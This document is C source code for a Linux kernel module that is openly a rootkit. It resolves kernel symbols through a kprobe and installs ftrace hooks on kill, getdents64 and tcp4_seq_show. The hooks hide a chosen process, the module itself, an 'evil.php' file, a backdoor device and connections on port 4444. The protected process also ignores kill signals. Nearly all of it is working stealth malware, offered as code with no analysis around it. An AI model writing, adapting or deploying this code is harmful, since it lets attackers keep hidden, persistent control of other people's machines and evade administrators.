#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include "fpointer.h"
#include "misc.h"


#define EVIL_DEVEICE "EVILBACKDOR"
#define EVIL_FILE "evil.php"

char hide_pid[NAME_MAX];
static pid_t __user *protect_pid;
static kallsyms_lookup_name_t  kallsyms_lookup_name_;
static sys_kill_t sys_kill_;
static sys_mkdir_t sys_mkdir_;
static sys_execve_t sys_execve_;
static tcp4_seq_show_t tcp4_seq_show_;
static sys_getdents64_t sys_getdents64_;
struct hook_information
{
    const char *name;   // Hook Function name
    unsigned long hook_function;   // Hook Active Function
    unsigned long hook_address;    // Hook orgin address
    struct ftrace_ops ops;
};

struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};


#ifdef __x86_64__
//if x64 arch
int GetKernelFunction(void){
    register_kprobe(&kp);
    kallsyms_lookup_name_ = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    sys_mkdir_ = (sys_mkdir_t)kallsyms_lookup_name_("__x64_sys_mkdir");
    sys_kill_ = (sys_kill_t)kallsyms_lookup_name_("__x64_sys_kill");
    sys_execve_ =(sys_execve_t)kallsyms_lookup_name_("__x64_sys_execve");
    tcp4_seq_show_ =(tcp4_seq_show_t)kallsyms_lookup_name_("tcp4_seq_show");
    sys_getdents64_ = (sys_getdents64_t)kallsyms_lookup_name_("__x64_sys_getdents64");
    if ((unsigned long)sys_mkdir_ != 0 || (unsigned long)sys_kill_ != 0 || (unsigned long )sys_execve_ != 0||(unsigned long)tcp4_seq_show_ != 0||(unsigned long)sys_getdents64_!=0)
    {
        // pr_info("sys_mkdir_ %px",(unsigned long)sys_mkdir_);
        // pr_info("sys_kill_ %px",(unsigned long)sys_kill_);
        // pr_info("sys_execve_ %px",(unsigned long)sys_execve_);
        // pr_info("tcp4_seq_show_ %px",(unsigned long)tcp4_seq_show_);
        goto success;
    }
    else{
        goto error;
    }
error:
    return -1;
success:
    return 0;
}
#elif defined(__i386__)
// if __i384 arch
int GetKernelFunction(void){
    pr_info("Do not Support _i386 arch");
    return -1;
}
#endif


void callback_func(unsigned long ip,unsigned long parent_ip,struct ftrace_ops *ops, struct pt_regs *regs){
    struct hook_information *hook = container_of(ops, struct hook_information, ops);
    if (!within_module(parent_ip,THIS_MODULE))
    {
        regs->ip = (unsigned long)hook->hook_function;
    }
}

int Initialize(struct hook_information *hook) {
    hook->ops.func = (ftrace_func_t)callback_func;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
    ftrace_set_filter_ip(&hook->ops, hook->hook_address, 0, 0);
    int err = register_ftrace_function(&hook->ops);
    if (err < 0) {
        pr_info("register ftrace error");
        return 0;
    }
    return 0;
}
int UnInitialize(struct hook_information *hook){
    unregister_ftrace_function(&hook->ops);
    return 0;
}

/* Get Userspace Signal */
static asmlinkage int Hook_syskill(struct pt_regs *regs){
    pid_t __user *kernel_pid = (pid_t*)(regs->di);
    int __user *kernel_sig = (int*)(regs->si);
    if (kernel_sig == 64 && (strncmp(hide_pid, "", NAME_MAX) == 0))
    {
        sprintf(hide_pid, "%d", kernel_pid);
        HideModule();
        //hide_pid[0] = kernel_pid;
        protect_pid =kernel_pid;
        pr_info("hide process %d",kernel_pid);
        pr_info("protect process %d",protect_pid);
        return 0;
    }
    else if (kernel_pid == protect_pid)
    {
        pr_info("Get kill signal %d",kernel_sig);
        if (kernel_sig==15||kernel_sig==9)
        {
            return 0;
        }
        return sys_kill_(regs);
    }
    else if (kernel_pid == protect_pid && kernel_sig == 64 )
    {
        ShowModule();
        return 0;
    }
    
    
    
    return sys_kill_(regs);
}

/* Some Command Can not user */
static asmlinkage int Hook_execve(struct pt_regs *regs){
    return sys_execve_(regs);
}

/* Hide Network Port */
static asmlinkage long Hook_tcp4_seq_show(struct seq_file *seq, void *v){
    // pr_info("Hook Message");
    struct inet_sock *is;
    long ret;
    unsigned short port = htons(4444);
    unsigned short fake_port = htons(80);
    ret = tcp4_seq_show_(seq,v);
    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (port == is->inet_dport) {
            // is->inet_dport = fake_port;
			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",ntohs(is->inet_sport), ntohs(is->inet_dport));
			return -1;
		}
	}
    return ret;
}



/* Hide process And Hide Some File*/
static asmlinkage int Hook_getdents64(struct pt_regs *regs){
    int offset = 0;
    int ret = sys_getdents64_(regs);
    struct linux_dirent64 *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *current_dirent,*previous_dir,*dirent_ker = NULL;
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (dirent_ker == NULL || ret <0)
        return ret;
    long err = copy_from_user(dirent_ker,dirent,ret);
    if (err < 0)
        return ret;

    while (offset < ret)
    {
        current_dirent = (void*)dirent_ker+offset;

        // //hide Some File==> evil.php
        if (memcmp(EVIL_FILE,current_dirent->d_name,strlen(EVIL_FILE))==0)
        {
            if (current_dirent==dirent_ker)
            {
                ret -= current_dirent->d_reclen;
                memmove(current_dirent,(void*)current_dirent+current_dirent->d_reclen,ret);
                continue;
            }
            previous_dir->d_reclen += current_dirent->d_reclen;
        }
        // hide some file file => evildevice
        else if (memcmp(EVIL_DEVEICE,current_dirent->d_name,strlen(EVIL_DEVEICE))==0)
        {
            if (current_dirent==dirent_ker)
            {
                ret -= current_dirent->d_reclen;
                memmove(current_dirent,(void*)current_dirent+current_dirent->d_reclen,ret);
                continue;
            }
            previous_dir->d_reclen += current_dirent->d_reclen;
        }
        // hide process
        else if (memcmp(hide_pid,current_dirent->d_name,strlen(hide_pid))==0 &&(strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            if (current_dirent==dirent_ker)
            {
                ret -= current_dirent->d_reclen;
                memmove(current_dirent,(void*)current_dirent+current_dirent->d_reclen,ret);
                continue;
            }
            previous_dir->d_reclen += current_dirent->d_reclen;
        }
        else{
            previous_dir = current_dirent;
        }
        offset += current_dirent->d_reclen;
    }
    
    if(copy_to_user(dirent,dirent_ker,ret)<0)
        return ret;

    // kfree(dirent_ker);
    return ret;
}





